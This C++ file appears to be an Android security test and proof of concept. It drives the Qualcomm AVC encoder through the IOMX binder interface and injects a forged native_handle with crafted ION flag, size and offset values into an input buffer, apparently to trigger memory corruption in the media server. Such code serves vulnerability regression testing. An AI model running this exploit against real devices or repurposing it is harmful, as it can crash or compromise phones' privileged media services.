/**
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#undef _GNU_SOURCE
#define _GNU_SOURCE
#include "../includes/common.h"
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>
#include <binder/ProcessState.h>
#include <gui/BufferQueue.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include "OMX_Component.h"
#include <stdlib.h>
#include <time.h>

using namespace android;
template <class T>
static void InitOMXParams(T *params) {
  params->nSize = sizeof(T);
  params->nVersion.s.nVersionMajor = 1;
  params->nVersion.s.nVersionMinor = 0;
  params->nVersion.s.nRevision = 0;
  params->nVersion.s.nStep = 0;
}
struct DummyOMXObserver : public BnOMXObserver {
 public:
  DummyOMXObserver() {}

  virtual void onMessages(const std::list<omx_message> &messages __unused) {}

 protected:
  virtual ~DummyOMXObserver() {}
};

struct DeathRecipient : public IBinder::DeathRecipient {
  DeathRecipient() : mDied(false) {}
  bool mDied;
  virtual void binderDied(const wp<IBinder> &who __unused) { mDied = true; }
  bool died() const { return mDied; }
};

bool connectOMX(sp<IOMX> &omx) {
  sp<IBinder> binder;
  sp<IServiceManager> sm = defaultServiceManager();
  binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> service = interface_cast<IMediaPlayerService>(binder);
  if (binder == NULL) {
    return false;
  }
  omx = service->getOMX();
  if (omx == NULL) {
    return false;
  }
  return true;
}

static const OMX_U32 kPortIndexInput = 0;
static const OMX_U32 kPortIndexOutput = 1;

int run_test() {
  android::ProcessState::self()->startThreadPool();

  sp<IOMX> service;
  if (connectOMX(service) == false) {
    return EXIT_FAILURE;
  }

  IOMX::node_id node = 0;
  int fenceFd = -1;
  sp<DummyOMXObserver> observer = new DummyOMXObserver();
  const char *codecName = "OMX.qcom.video.encoder.avc";
  status_t err = service->allocateNode(codecName, observer, nullptr, &node);
  if (err != OK) {
    return EXIT_FAILURE;
  }

  sp<DeathRecipient> deathRecipient(new DeathRecipient());
  IInterface::asBinder(service)->linkToDeath(deathRecipient);
  MetadataBufferType mInputMetadataType =
      (MetadataBufferType)kMetadataBufferTypeGrallocSource;
  err = service->storeMetaDataInBuffers(node, kPortIndexInput, OMX_TRUE,
                                        &mInputMetadataType);

  OMX_PARAM_PORTDEFINITIONTYPE def;
  InitOMXParams(&def);
  def.nPortIndex = kPortIndexInput;
  OMX_INDEXTYPE omx_indextype = OMX_IndexParamPortDefinition;
  err = service->getParameter(node, omx_indextype, &def, sizeof(def));
  def.format.video.eColorFormat = OMX_COLOR_FormatAndroidOpaque;
  err = service->setParameter(node, omx_indextype, &def, sizeof(def));

  err = service->sendCommand(node, OMX_CommandStateSet, 0);

  // Input
  InitOMXParams(&def);
  def.nPortIndex = kPortIndexInput;
  omx_indextype = OMX_IndexParamPortDefinition;
  err = service->getParameter(node, omx_indextype, &def, sizeof(def));
  int inMemSize = def.nBufferCountActual * def.nBufferSize;
  int inBufferCnt = def.nBufferCountActual;
  int inBufferSize = inMemSize / inBufferCnt;
  sp<MemoryDealer> dealerIn = new MemoryDealer(inMemSize);
  IOMX::buffer_id *inBufferId = new IOMX::buffer_id[inBufferCnt];

  for (int i = 0; i < inBufferCnt; i++) {
    sp<IMemory> memory = dealerIn->allocate(inBufferSize);
    err = service->allocateBufferWithBackup(
        node, kPortIndexInput /*in port index*/, memory, &inBufferId[i],
        inBufferSize);
    if (err != NO_ERROR) ALOGI("allocateBufferWithBackup failed!");
    memset(memory->pointer(), 0xff, inBufferSize);
  }

  // Output
  InitOMXParams(&def);
  def.nPortIndex = kPortIndexOutput;
  err = service->getParameter(node, omx_indextype, &def, sizeof(def));

  int outMemSize = def.nBufferCountActual * def.nBufferSize;
  int outBufferCnt = def.nBufferCountActual;
  int outBufferSize = outMemSize / outBufferCnt;
  sp<MemoryDealer> dealerOut = new MemoryDealer(outMemSize);
  IOMX::buffer_id *outBufferId = new IOMX::buffer_id[outBufferCnt];

  for (int i = 0; i < outBufferCnt; i++) {
    sp<IMemory> memory = dealerOut->allocate(outBufferSize);
    memset(memory->pointer(), 0xff, outBufferSize);
    err = service->useBuffer(node, kPortIndexOutput, memory, &outBufferId[i],
                             outBufferSize);
  }

  {
    native_handle *h;
    int private_data[80];
    memset(private_data, 0xdd, 80 * sizeof(int));
    private_data[0] = 'gmsm';
    private_data[1] = 0x00000008;  // PRIV_FLAGS_USES_ION
    private_data[2] = 0x00010000;  // size
    private_data[3] = 0x0001f000;  // offset
    private_data[7] = 0x00000000;
    GraphicBuffer *gf;
    gf = new GraphicBuffer(0x1000, 0x1000, PIXEL_FORMAT_RGBA_8888, 666);
    h = native_handle_create(2, 17);
    memcpy(h->data, gf->handle->data, gf->handle->numFds * sizeof(int));
    memcpy(h->data + gf->handle->numFds, private_data,
           gf->handle->numInts * sizeof(int));
    gf->handle = h;
    service->updateGraphicBufferInMeta(node, kPortIndexInput, gf,
                                       inBufferId[0]);
  }

  err = service->sendCommand(node, OMX_CommandStateSet, 2);

  for (int i = 0; i < inBufferCnt; i++) {
    err = service->emptyBuffer(node, inBufferId[i], kPortIndexInput,
                               inBufferSize, 0, 0, fenceFd);
  }

  err = service->freeNode(node);
  return 0;
}

int main() {
  time_t test_started = start_timer();
  while (timer_active(test_started)) {
    run_test();
  }
  return 0;
}
